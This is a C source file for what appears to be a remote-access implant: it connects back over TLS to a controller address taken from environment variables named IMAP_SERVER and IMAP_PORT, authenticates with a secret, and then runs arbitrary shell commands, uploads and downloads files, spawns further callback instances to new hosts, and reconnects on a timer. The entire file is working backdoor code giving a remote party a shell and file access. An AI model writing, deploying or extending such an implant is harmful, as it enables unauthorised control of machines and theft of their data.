#include "server.h"

// Prototype functions
int newconn(SSL *, pid_t *);
int cmdshell(SSL *);
int getfile(SSL *);
int putfile(SSL *);
//int tunnel(SSL *);
int winset(SSL *, int *);
int entersession(SSL *, int *, int *);
int resolveandconnect(int *, int8_t *, int);
ssize_t ssl_readall(SSL *, uint8_t *, size_t);
ssize_t ssl_writeall(SSL *, uint8_t *, size_t);
ssize_t readall(int, uint8_t *, size_t, size_t *);
ssize_t writeall(int, uint8_t *, size_t, size_t *);
SSL_CTX* initCTX(void);

int newconn(SSL *ssl, pid_t *pids) {
  FILE *fp;
  pid_t pid;
  char *env;
  char *pidstr;
  char port[6];
  char addr[INET6_ADDRSTRLEN];
  uint8_t buf[4096] = {0};

  if (ssl_writeall(ssl, (uint8_t *)"100", 4) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)addr, sizeof(addr)) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)"101", 4) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)port, sizeof(port)) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)"102", 4) < 0) {return FAIL;}

  pid = fork();
  if (pid == -1) {
    if (ssl_writeall(ssl, (uint8_t *)"-1", 3) < 0) {return FAIL;}
  } else if (pid == 0) {
    setenv("IMAP_SERVER", addr, 1);
    setenv("IMAP_PORT", port, 1);
    env = getenv("PATH");
    strncpy((char *)buf, env, sizeof(buf)-1);
    sprintf((char *)buf + strlen((char *)buf), ":.");
    setenv("PATH", (char *)buf, 1);
    execlp("sbs", "sbs", (char*)NULL);
  } else {
    memset(buf, 0, sizeof(buf));
    fp = popen("pidof sbs", "r");
    fgets((char *)buf, sizeof(buf), fp);
    pidstr = strtok((char *)buf, " ");
    if (ssl_writeall(ssl, (uint8_t *)pidstr, strlen(pidstr)+1) < 0) {
      // Do nothing so that we can still get the pids
    }
    for (size_t i = 0; i < 64; i++) {
      if (pids[i] == 0) {
        pids[i] = atoi(pidstr);
        break;
      }
    }
  }

  return SUCCESS;
}

int cmdshell(SSL *ssl) {
  //https://stackoverflow.com/questions/33884291/pipes-dup2-and-exec
  //https://stackoverflow.com/questions/21558937/i-do-not-understand-how-execlp-works-in-linux
  FILE *fp;
  uint8_t buf[2048] = {0};

  fp = popen("date", "r");
  while (fgets((char *)buf, sizeof(buf), fp) != NULL) {
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {
      pclose(fp);
      return FAIL;
    }
  }
  pclose(fp);

  memset(buf, 0, sizeof(buf));
  while(ssl_readall(ssl, buf, sizeof(buf)) > 0) {
    fp = NULL;
    if (strcmp((char *)buf, "exit\n") == 0) {
      return RECOVER;
    }

    if ((fp = popen((char *)buf, "r")) == NULL) {
      if (ssl_writeall(ssl, (uint8_t *)"failed", 7) < 0) {return FAIL;}
      continue;
    }

    while(fgets((char *)buf, sizeof(buf), fp) != NULL) {
      if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
      memset(buf, 0, sizeof(buf));
    }
    if (ssl_writeall(ssl, (uint8_t *)"", 1) < 0) {return FAIL;}

    memset(buf, 0, sizeof(buf));
    pclose(fp);
  }
  
  return SUCCESS;
}

int getfile(SSL *ssl) {
  int fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  size_t readin = 0;
  struct stat st;

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"300", 4) < 0) {return FAIL;}

  // Recieve the name of the file that the client would like
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

  // Ensure we can open the file that is being asked for
  if((fd = open((char *)buf, O_RDONLY)) == -1) {
    if (ssl_writeall(ssl, (uint8_t *)"-1", 3) < 0) {return FAIL;}
    return RECOVER;
  }

  // Get the file size and then rewind to the begining of the file
  fstat(fd, &st);
  filesize = st.st_size;
  sprintf((char *)ans, "%ld", filesize);
  if (ssl_writeall(ssl, ans, sizeof(ans)) < 0) {goto failure;}

  // Send the file
  while(readin < (size_t)filesize) {
    memset(buf, 0, sizeof(buf));
    if (readall(fd, buf, (size_t)filesize - readin % sizeof(buf), &readin) < 0) {
      return RECOVER;
    }
    if (ssl_writeall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
  }

  close(fd);
  return SUCCESS;

  failure:
  close(fd);
  return FAIL;
}

int putfile(SSL *ssl) {
  int fd;
  uint8_t ans[256] = {0};
  uint8_t buf[4096] = {0};
  ssize_t filesize = 0;
  size_t written = 0;

  // Tell the client we are good to begin the process
  if (ssl_writeall(ssl, (uint8_t *)"400", 4) < 0) {return FAIL;}

  // Recieve the name of the file that the client would like
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

  // Ensure we can open the file that is being asked for
  if((fd = open((char *)buf, O_WRONLY | O_APPEND | O_CREAT, 0644)) == -1) {
    if(ssl_writeall(ssl, (uint8_t *)"-1", 3) < 0) {return FAIL;}
    return RECOVER;
  }

  if (ssl_writeall(ssl, (uint8_t *)"401", 4) < 0) {goto failure;}

  // Recieve the filesize from the client
  if (ssl_readall(ssl, ans, sizeof(ans)) < 0) {goto failure;}
  filesize = atoi((char *)ans);
  if (filesize < 1) {
    return RECOVER;
  };

  // Download the file
  while(written < (size_t)filesize) {
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {goto failure;}
    if (writeall(fd, buf, (size_t)filesize - written % sizeof(buf), &written) < 0) {goto failure;}
    memset(buf, 0, sizeof(buf));
  }
  close(fd);

  return SUCCESS;

  failure:
  close(fd);
  return FAIL;
}

/*
int tunnel(SSL *ssl) {

}
*/
int winset(SSL *ssl, int *time) {
  uint8_t ans[256] = {0};

  if (ssl_writeall(ssl, (uint8_t *)"600", 4) < 0) {return FAIL;}
  if (ssl_readall(ssl, (uint8_t *)ans, sizeof(ans)) < 0) {return FAIL;}
  if (ssl_writeall(ssl, (uint8_t *)"601", 4) < 0) {return FAIL;}

  *time = atoi((char *)ans);

  return SUCCESS;
}

int entersession(SSL *ssl, int *clientfd, int *time) {
  int res;
  int cmd;
  int conn;
  int count = 0;
  pid_t pids[64];
  pid_t servpid;
  uint8_t buf[4096] = {0};

  // initialize the pids
  for (size_t i = 0; i < 64; i++) {
    pids[i] = 0;
  }

  // Attach the socket descriptor to the SSL conneciton state
  SSL_set_fd(ssl, *clientfd);                         
  while((conn = SSL_connect(ssl)) <= 0) {
    switch(SSL_get_error(ssl, conn)) {
      case SSL_ERROR_WANT_READ:
      case SSL_ERROR_WANT_WRITE:
        break;
    }
  }

  // Make sure we are gtg with non blocking mode
  SSL_set_mode(ssl, SSL_MODE_AUTO_RETRY);
  SSL_set_mode(ssl, SSL_MODE_ENABLE_PARTIAL_WRITE);
  SSL_set_mode(ssl, SSL_MODE_ACCEPT_MOVING_WRITE_BUFFER);

  // Message the client that we are ready to authenticate
  if (ssl_writeall(ssl, (uint8_t *)"10", 3) < 0) {return FAIL;}          

  // Read the authentication secret into memory
  if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}

  // Keep checking to see if the sent auth message is gtg
  while (strncmp((char *)buf, AUTH, strlen(AUTH) != 0) && count < 3) {       
    if (ssl_writeall(ssl, (uint8_t *)"50", 3) < 0) {return FAIL;}
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
    count++;
  }
  if (ssl_writeall(ssl, (uint8_t *)"10", 3) < 0) {return FAIL;}

  while(1) {
    // Wait for the client to tell me to do something
    memset(buf, 0, sizeof(buf));
    if (ssl_readall(ssl, buf, sizeof(buf)) < 0) {return FAIL;}
    cmd = atoi((char *)buf);

    // Run the specified command
    switch (cmd) {
      case NEW:
        res = newconn(ssl, pids);
        break;
      case CMD:
        res = cmdshell(ssl);
        break;
      case GET:
        res = getfile(ssl);
        break;
      case PUT:
        res = putfile(ssl);
        break;
      case TUN:
        //res = tunnel(ssl);
        break;
      case WIN:
        res = winset(ssl, time);
        break;
      case BYE:
        servpid = getpid();
        for (size_t i = 0; i < 64; i++){
          if (pids[i] != servpid && pids[i] != 0) {
            kill(pids[i], SIGKILL);
          }
        }
        return EXIT;
      default:
        break;
    }
    if (res < 0) {
      return res;
    }
  }

  return EXIT;
}

ssize_t ssl_readall(SSL *ssl, uint8_t *buf, size_t len) {
    int r = 0;
    size_t recvd = 0;

    while (recvd < len) {
      r = SSL_read(ssl, &buf[recvd], len-recvd);
      if (r <= 0) {
        if (SSL_get_error(ssl, r) == SSL_ERROR_WANT_READ) {
          continue;
        }
        return FAIL;
      } else {
        recvd += r;
        if (strcmp((char *)&buf[recvd-1], (char *)"\0") == 0) {
          break;
        }
      }
    }
    return r;
}

ssize_t ssl_writeall(SSL *ssl, uint8_t *msg, size_t len) {
  int s = 0;
  size_t sent = 0;

  while (sent < len) {
    if ((s = SSL_write(ssl,  &msg[sent], len-sent)) <= 0) {
      if (SSL_get_error(ssl, s) == SSL_ERROR_WANT_WRITE) {
        continue;
      }
      return FAIL;
    }
    sent += s;
  }

  return s;
}

ssize_t readall(int fd, uint8_t *buf, size_t len, size_t *total_read) {
  ssize_t r = 0;
  size_t readin = 0;

  while(readin < len) {
    if ((r = read(fd, &buf[readin], len-readin)) <= 0) {
      break;
    }
    (*total_read) +=r;
    readin += r;
  }

  return r;
}

ssize_t writeall(int fd, uint8_t *buf, size_t len, size_t *total_written) {
  ssize_t w = 0;
  size_t written = 0;
  
  while(written < len) {
    if ((w = write(fd, &buf[written], len-written)) < 0) {
      break;
    } else if (w == 0) {
      break;
    }
    (*total_written) += w;
    written += w;
  }

  return w;
}

int resolveandconnect(int *sockfd, int8_t *addr, int port) {
  int keepcnt = 3;
  int keepidle = 5; 
  int keepintvl = 5;
  int keepalive = 1;
  int connected = 0;
  char portstr[6];
  struct addrinfo hints, *serveraddr, *p;
  struct timeval timeout;

  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;

  snprintf(portstr, 6,"%d", port);

  if (getaddrinfo((char *)addr, portstr, &hints, &serveraddr) != 0) {return FAIL;}

  for(p = serveraddr; p != NULL; p = p->ai_next) {
    // Check to see if the addrsocket works
    if (((*sockfd) = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
      continue;
    }

    if (connect((*sockfd), p->ai_addr, p->ai_addrlen) < 0) {
      continue;         
    }
    connected = 1;
    break;
  }

  freeaddrinfo(serveraddr);  // All done with the struct at this point

  if (connected == 0) {return FAIL;}

  // Set socket timeout
  timeout.tv_sec = 90;
  timeout.tv_usec = 0;
  if (setsockopt(*sockfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {return FAIL;}
  if (setsockopt(*sockfd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout)) < 0) {return FAIL;}

  // Set keepalives
  if (setsockopt(*sockfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {return FAIL;}
  if (setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {return FAIL;}
  if (setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {return FAIL;}
  if (setsockopt(*sockfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {return FAIL;}

  if (fcntl(*sockfd, F_SETFL, O_NONBLOCK) < 0) {return -1;}

  return SUCCESS;
}

SSL_CTX* initCTX(void) {
  SSL_CTX *ctx;
  const SSL_METHOD *method;

  OpenSSL_add_all_algorithms();       // Load & register all cryptos, etc.
  SSL_load_error_strings();           // Load all error messages
  method = TLS_client_method();       // Create new server-method instance
  ctx = SSL_CTX_new(method);          // Create new context from method
  if (ctx == NULL) {                  // Check for errors
    ERR_print_errors_fp(stderr);
    abort();
  }

  return ctx;
}

int main(void) {
  const char* addr;
  const char* port;
  int clientfd;
  int time = 5;
  SSL *ssl;
  SSL_CTX *ctx;

  //daemon(0,0);

  addr = getenv("IMAP_SERVER");
  port = getenv("IMAP_PORT");

  if (addr == NULL || port == NULL) {return FAIL;}

  while (1) {
    // Create new SSL connection state
    SSL_library_init();
    ctx = initCTX();
    ssl = SSL_new(ctx);                             

    // Connect to the client and then set the SSL fd to the socket
    if (resolveandconnect(&clientfd, (int8_t *)addr, atoi((char *)port)) != SUCCESS) {
      goto reset;
    }
    
    // Enter the session
    entersession(ssl, &clientfd, &time);                    

    // Clean up the SSL context and close the socket
    SSL_free(ssl);                                  
    close(clientfd);                                
    SSL_CTX_free(ctx);                              

    // Sleep for a set amount of time and then start up again 
    reset:
    sleep(time);                                    
  }

  return SUCCESS;
}